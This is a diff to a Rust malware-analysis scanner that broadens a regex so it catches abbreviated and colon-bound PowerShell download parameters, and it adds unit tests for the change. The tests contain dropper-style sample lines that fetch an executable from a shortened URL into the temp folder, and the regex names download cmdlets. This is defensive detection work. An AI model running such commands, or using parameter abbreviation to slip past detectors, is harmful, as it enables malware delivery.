@@ -10134,7 +10134,7 @@ pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
             r#"(?ix)
                 \b (?: Start-Process | saps | iwr | irm
                      | Invoke-WebRequest | Invoke-RestMethod ) \b
-                \s+ (?:-(?:Uri|FilePath|Path)\s+)?
+                \s+ (?:-(?:Uri|Ur|FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F|Path|Pat|Pa|P)(?:\s+|[:=]))?
                 ['"]
                 (
                     (?:[a-z0-9\-]+\.){1,4}
@@ -11919,6 +11919,18 @@ mod ps_bare_url_download_tests {
         // document.vbs / test1.vbs corpus shape.
         let s = r#"iwr -Uri 'rebrand.ly/47i82k6' -OutFile $env:TEMP\f.exe"#;
         assert_eq!(urls(s), vec!["http://rebrand.ly/47i82k6".to_string()]);
+    }
+
+    #[test]
+    fn iwr_short_uri_bare_host_synthesizes_http_prefix() {
+        let s = r#"iwr -Ur 'rebrand.ly/shorturi' -OutFile $env:TEMP\f.exe"#;
+        assert_eq!(urls(s), vec!["http://rebrand.ly/shorturi".to_string()]);
+    }
+
+    #[test]
+    fn iwr_colon_bound_short_uri_bare_host_synthesizes_http_prefix() {
+        let s = r#"iwr -Ur:'rebrand.ly/colonuri' -OutFile $env:TEMP\f.exe"#;
+        assert_eq!(urls(s), vec!["http://rebrand.ly/colonuri".to_string()]);
     }
 
     #[test]
